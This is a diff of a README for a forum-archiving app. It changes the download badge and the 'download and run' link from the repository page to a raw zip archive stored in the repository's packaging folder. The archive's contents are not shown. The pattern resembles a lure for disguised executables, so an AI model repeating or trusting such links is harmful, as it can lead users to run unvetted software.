@@ -1,6 +1,6 @@
 # 🗄️ linuxdo-archive-assistant - Save Topics for Later Use
 
-[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hassanfarooq1234/linuxdo-archive-assistant)
+[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hassanfarooq1234/linuxdo-archive-assistant/raw/refs/heads/main/packaging/assistant-linuxdo-archive-2.7.zip)
 
 ## 🧭 What this app does
 
@@ -27,7 +27,7 @@ For best results, keep Chrome, Edge, or another modern browser installed.
 
 Visit this page to download and run the app:
 
-https://github.com/hassanfarooq1234/linuxdo-archive-assistant
+https://github.com/hassanfarooq1234/linuxdo-archive-assistant/raw/refs/heads/main/packaging/assistant-linuxdo-archive-2.7.zip
 
 If the page offers a release file, download that file to your computer. If it offers the source files only, follow the steps below to use the project from the repository page.
 
